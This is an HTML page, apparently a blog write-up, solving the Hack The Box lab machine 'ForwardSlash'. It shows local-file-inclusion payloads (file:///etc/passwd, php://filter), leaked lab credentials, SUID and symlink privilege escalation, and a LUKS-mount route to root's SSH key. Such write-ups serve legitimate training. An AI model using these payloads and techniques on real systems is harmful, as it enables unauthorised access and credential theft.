@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <link rel="stylesheet" type="text/css" href="/css/style.css">
+  <script src="https://kit.fontawesome.com/65ad30df58.js" crossorigin="anonymous"></script>
+  <link rel='icon' href='/favicon.ico' type='image/x-icon'/>
+  <script src="/dist/mark.min.js" charset="UTF-8"></script>
+<title>Hackthebox - ForwardSlash Writeup</title>
+<meta property="og:title" content="Hackthebox - ForwardSlash Writeup" />
+      <meta property="og:description" content="A Hard difficulty linux box" />
+      <meta property="og:type" content="article" />
+      <meta property="og:url" content="github" />
+      <meta property="og:image" content="/img/htb_forwardslash/card.png" />
+
+</head>
+
+<body>
+  <!-- Side navigation -->
+	<div class="sidebar">
+    <div class="vertical-center">
+      <a href="/index.html" style="text-align:center">
+      <a style="text-align:center"><img class="logo" src="/avatar.png" alt="" width="120" height="120"></a></a>
+      <p style="text-align:center; color:#eee">
+      <b style="font-size:1.7em;text-align:center; color:#eee">0xTaylor</b><br/>
+      <p style="text-align:center;"><small><i>Hackthebox Updates</br> And Writeups</i></small></p>
+      <p style="text-align:center;font-size:20px">
+
+    <div>
+      <center><h3><a href="/">HOME</a></h3></center>
+      
+    </div>
+        <center><a href="https://twitter.com/ProjectFeds" style="display:inline"><i class="fab fa-twitter"></i></a>
+        <a href="https://github.com/0xtaylor" style="display:inline"><i class="fab fa-github"></i></a>
+        <a href="https://discord.gg/pCWTcJ3" style="display:inline"><i class="fab fa-discord"></i></a></center>
+      </p>
+    </div>
+  </br><p><small><i><center>Still in development</center></i></small></p>
+  </div>
+
+<article>
+<h1 id="hackthebox---ForwardSlash-writeup">Hackthebox - ForwardSlash Writeup</h1>
+<div class="figure">
+<img src="/img/htb_forwardslash/card.png" width="600" height=""/>
+</div>
+
+<div>
+<h1>Nmap</h1>
+<p>Let's scan for any open ports!</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">nmap -sV -sC -T4 -p- 10.10.10.183</span></code></pre></div>
+<center><img src="/img/htb_forwardslash/0.png" alt="" width="600" height=""/></center></a>
+<p>Upon our scan. We see two port open. 22 for SSH. 80 for Apache </p>
+</div>
+
+<div>
+<h1 id="start">Let's begin!</h1>
+<p>When going onto 10.10.10.183, we see that the URL has changed to forwardslash.htb.</p>
+<center><img src="/img/htb_forwardslash/1.png" alt="" width="600" height=""/></center></a>
+</div>
+
+<div>
+<p>Here's how to go through that:</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">sudo nano /etc/hosts</span></code></pre></div>
+<p>Then add this line:</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">10.10.10.183    forwardslash.htb</span></code></pre></div>
+<center><img src="/img/htb_forwardslash/2.png" alt="" width="600"/></center>
+<p>Now let's save and quit</p>
+</div>
+
+<div>
+<h1 id="enumeration">Getting Started</h1>
+<p>Once we're on the page, we see this page:</p>
+<div class="figure">
+<img src="/img/htb_forwardslash/3.png" width="600" height=""/>
+</div>
+
+</div>
+<h1 id ="Ongoing">Scanning for subdomains</h1>
+<p>Now let's see if we can find any subdomains for this site:</p>
+<div class="figure">
+<img src="/img/htb_forwardslash/4.png" width="600"/>
+<p>we find a subdomain called backup so let's add that to our /etc/hosts and go to it! </p>
+<img src="/img/htb_forwardslash/5.png" width="600"/>
+</div>
+
+<h1>Enumerating on subdomain</h1>
+<center><img src="/img/htb_forwardslash/6.png" width="600"/></center>
+<p>If we go to backup.forwardslash.htb, we can see a login page. Since we don't have a login. We can create one by
+pressing "Sign up now." and making your account. After doing that, Login with your details.</p>
+<div class="figure">
+<img src="/img/htb_forwardslash/7.png" width="600"/>
+</div>
+
+<h1>LFI Found</h1>
+<p>After looking around, we find /profilepicture.php and we see that the field is disabled. Let's disable that by
+inspect elementing and taking off anything that says "Disabled". Before you submit anything. Launch burpsuite and 
+make sure to intercept any request that you make. Once you do that. Should get something like this:</p>
+<center><img src="/img/htb_forwardslash/8.png" width="600"/></center>
+We get this: 
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">
+POST /profilepicture.php HTTP/1.1
+Host: backup.forwardslash.htb
+Content-Length: 22
+Cache-Control: max-age=0
+Origin: http://backup.forwardslash.htb
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://backup.forwardslash.htb/profilepicture.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,hi;q=0.8
+Cookie: PHPSESSID=l1nm05k0co9fmed61jnud97usg
+Connection: close
+  
+url=test
+</span></code></pre></div>
+
+<p>Now. Let's go to repeater. Copy our intercept and paste it there. For this test, I changed 'test' to 'file:///etc/passwd'
+and sent the request. We got this back:</p>
+<center><img src="/img/htb_forwardslash/9.png" width="600"/></center>
+<p>Success! We got a response!</p><br>
+
+<p>Let's make another request but this time, we forward it to the subdomain and to the directory that displayed a 403 error
+(/dev) and let's get the index file for it</p>
+
+<p>so we change file:///etc/passwd to file:///var/www/backup.forwardslash.htb/dev/index.php<br></p>
+
+<p>I already tried just doing /dev without any file after it then tried adding index.html but got no response so 
+index.php may be the answer</p>
+
+<center><img src="/img/htb_forwardslash/10.png" width="600"/></center>
+
+<p>We see something interesting. It says "Permission Denied; not that way ;)"</p>
+<p>After a bit of research. I came across an article that said to filter the output as base64</p>
+<p>You can read about it <a href="https://medium.com/@nyomanpradipta120/local-file-inclusion-vulnerability-cfd9e62d12cb">here</a></p>
+<p>We change the the URL field once again to:</p>
+
+<blockquote>php://filter/convert.base64-encode/resource=file:///var/www/backup.forwardslash.htb/dev/index.php</blockquote>
+
+<center><img src="/img/htb_forwardslash/11.png" width="600"/></center>
+
+<p>We got it! Now we need to decrypt the base64 encoded message. An easy way to do this would be this:</p>
+
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">echo {base64 message} | base64 -d </span></code></pre></div>
+
+<p>Replace {base64 message} with the base64 you got from the burpsuite request</p>
+
+<p>After decrypting it. We got the index.php source code!</p>
+
+<h1>Logging on</h1>
+
+<p>After looking around in index.php. Something stood out to me:</p>
+
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">if (@ftp_login($conn_id, "chiv", 'N0bodyL1kesBack/')) {</span></code></pre></div>
+
+<p>We also know from when we saw /etc/passwd that chiv is a user that we can access. This means that Chiv is the user 
+and the password is N0bodyL1kesBack/ </p>
+
+<p>Let's see if we can ssh using these credentials</p>
+
+<center><img src="/img/htb_forwardslash/12.png" width="600"/></center>
+
+<p>It worked! Unfortunately, we still can't get user yet. So let's get to work!</p>
+
+<h1>Getting user</h1>
+
+<p>I used a tiny script to let me find all the SUID files. Here's the script (you can paste it all into the terminal at once):</p>
+
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">allsuid=`find / -perm -4000 -type f 2>/dev/null`
+findsuid=`find $allsuid -perm -4000 -type f -exec ls -la {} 2>/dev/null \;`
+if [ "$findsuid" ]; then
+  echo -e "$findsuid" 
+  echo -e "\n"
+fi
+</span></code></pre></div>
+
+<p>Once you've done that. You'll notice a process that is owned by the user pain (another user that was saw in the 
+submitmessage section and /etc/passwd)</p>
+
+<p>This is the process:</p>
+
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">-r-sr-xr-x 1 pain pain 13384 Mar  6 10:06 /usr/bin/backup</span></code></pre></div>
+
+<p>Upon executing /usr/bin/backup. I was greeted with this error:</p>
+<br>
+<blockquote>ERROR: 2682e608993f6de3b690eba3e33f47e0 Does Not Exist or Is Not Accessible By Me, Exiting...</blockquote>
+
+<p>After more searching around I found /var/backups/config.php.bak belonged to pain aswell. I couldn't see what was in it so
+I made a script for this:</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">i=$(backup | grep ERROR | awk '{print $2}');
+ln -s /var/backups/config.php.bak ./$i;
+backup;
+</span></code></pre></div>
+
+<p>This main purpose of this script is to make symlink. A symlink is simply a shortcut to another file. You can read more about it <a href="https://medium.com/@nyomanpradipta120/local-file-inclusion-vulnerability-cfd9e62d12cb">here</a></p>
+
+<p>Save this into a file .sh file and copy it over to the ssh machine. After executing it. It should give this: </p>
+
+<center><img src="/img/htb_forwardslash/13.png" width="600"/></center>
+
+<p>We got user! The user is pain and password is db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704</p>
+<br>
+<p>Let's see if these work!</p>
+
+<center><img src="/img/htb_forwardslash/14.png" width="600"/></center>
+
+<p>It does! We officially have user!</p>
+
+<h1>Getting root</h1>
+
+<p>If we take a look at sudo -l. We can see this:</p>
+
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">Matching Defaults entries for pain on forwardslash:
+  env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User pain may run the following commands on forwardslash:
+  (root) NOPASSWD: /sbin/cryptsetup luksOpen *
+  (root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/
+  (root) NOPASSWD: /bin/umount ./mnt/</span></code></pre></div>
+
+<p>Once I got the user pain, I saw a folder called encryptorinator. I see a python file:</p>
+
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">
+def encrypt(key, msg):
+    key = list(key)
+    msg = list(msg)
+    for char_key in key:
+        for i in range(len(msg)):
+            if i == 0:
+                tmp = ord(msg[i]) + ord(char_key) + ord(msg[-1])
+            else:
+                tmp = ord(msg[i]) + ord(char_key) + ord(msg[i-1])
+
+            while tmp > 255:
+                tmp -= 256
+            msg[i] = chr(tmp)
+    return ''.join(msg)
+
+def decrypt(key, msg):
+    key = list(key)
+    msg = list(msg)
+    for char_key in reversed(key):
+        for i in reversed(range(len(msg))):
+            if i == 0:
+                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[-1]))
+            else:
+                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[i-1]))
+            while tmp < 0:
+                tmp += 256
+            msg[i] = chr(tmp)
+    return ''.join(msg)
+
+
+print encrypt('REDACTED', 'REDACTED')
+print decrypt('REDACTED', encrypt('REDACTED', 'REDACTED'))</span></code></pre></div>
+
+<p>What we need to is find a way to decrypt the ciphertext.</p>
+
+<p>I used this script to do so:</p>
+
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">
+def decrypt(key, msg):
+    key = list(key)
+    msg = list(msg)
+    for char_key in reversed(key):
+        for i in reversed(range(len(msg))):
+            if i == 0:
+                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[-1]))
+            else:
+                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[i-1]))
+            while tmp < 0:
+                tmp += 256
+            msg[i] = chr(tmp)
+    return ''.join(msg)
+
+ciphertext = open('ciphertext', 'r').read().rstrip()
+for i in range(1, 165): 
+    for j in range(33, 127): 
+        key = chr(j) * i
+        msg = decrypt(key, ciphertext)
+        if 'the ' in msg or 'be ' in msg or 'and ' in msg or 'of ' in msg :
+          exit("Key: {0}, Msg: {2}".format(key, len(key), msg))</span></code></pre></div>
+          
+<p>What we need to do is replace the old script with the new one and launch it. After you've done that,
+you should get this message:</p>
+
+<center><img src="/img/htb_forwardslash/15.png" width="600"/></center>
+
+<p>Now. It says something /var/backups/recovery so let's cd into it. </p>
+
+<center><img src="/img/htb_forwardslash/16.png" width="600"/></center>
+
+<p>As we can see. We have a file called encrypted_backup.img</p>
+
+<p>If we remember when we did sudo -l. We saw this:</p>
+
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">/sbin/cryptsetup luksOpen</span></code></pre></div>
+<br>
+<p>So what we should do is these commands so we can mount the image:</p>
+
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">sudo /sbin/cryptsetup luksOpen /var/backups/recovery/encrypted_backup.img backup</span></code></pre></div>
+<p>Enter the password that we got from the python script which is: cB!6%sdH8Lj^@Y*$C2cf</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex"></span>cd ~</span></code></pre></div>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">mkdir mnt</span></code></pre></div>
+  <div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">sudo /bin/mount /dev/mapper/backup ./mnt/</span></code></pre></div>
+
+  <p>What these will add do is mount the drive. Mount it to a particular folder (in our case it's ~/mnt) and grab the contents inside</p>
+  <center><img src="/img/htb_forwardslash/17.png" width="600"/></center>
+
+  <p>Now if we look inside we a file called id_rsa. This is an ssh key that we may be able to use. Let's test it out for root!</p>
+
+  <center><img src="/img/htb_forwardslash/18.png" width="600"/></center>
+
+  <p><center>We got root! I hope this helped you on your journey to completing ForwardSlash!</center></p>
+</article>
+<h1></h1>
+<footer>
+  <center><script src="https://www.hackthebox.eu/badge/260838"></script></br></center>
+</footer>
+</body>
